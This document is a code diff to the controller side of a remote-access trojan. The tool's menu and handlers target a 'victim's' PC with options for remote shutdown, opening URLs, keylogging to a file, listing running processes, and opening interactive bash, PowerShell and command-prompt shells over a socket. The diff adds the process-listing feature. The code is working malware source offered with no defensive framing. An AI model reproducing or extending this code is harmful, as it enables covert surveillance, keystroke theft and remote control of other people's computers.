@@ -24,9 +24,10 @@ class Server():
         4.) SHUTDOWN VICTIM'S PC
         5.) OPEN URL IN VICTIM'S BROWSER
         6.) START LOGGING VICTIM'S KEYBOARD IN A TEXT FILE
-        7.) OPEN VICTIM'S BASH
-        8.) OPEN VICTIM'S POWERSHELL
-        9.) OPEN VICTIM'S COMMAND PROMPT
+        7.) GET ALL RUNNING TASKS IN VICTIM'S PC (WINDOWS ONLY)
+        8.) OPEN VICTIM'S BASH
+        9.) OPEN VICTIM'S POWERSHELL
+        10.) OPEN VICTIM'S COMMAND PROMPT
         """
         print(chalk.red(msg))
         choice=input(chalk.red("CHOOSE AN OPTION : "))
@@ -76,17 +77,22 @@ class Server():
                     print(dkey)
                     with open("key_log.log","a") as f:
                         f.write(dkey+"\n")
-            # Open Bash
+            # Get All Running Process
             elif choice==7:
+                self.c.send("get_running_process".encode())
+                print("Process Name\t\tPID")
+                print(self.c.recv(99999).decode())
+            # Open Bash
+            elif choice==8:
                 self.c.send("open_bash".encode())
                 while True:
                     _bash_cmd=input("Victim's Bash >>>")
                     self.c.send(_bash_cmd.encode())
                     print(self.c.recv(99999).decode())
             # Open Powershell
-            elif choice==8:...
-            # Open Command Prompt
             elif choice==9:...
+            # Open Command Prompt
+            elif choice==10:...
     @staticmethod
     def init_socket(_addr:str,_port:int) -> Tuple[socket.socket,Tuple[str,int]]:
         s=socket.socket()
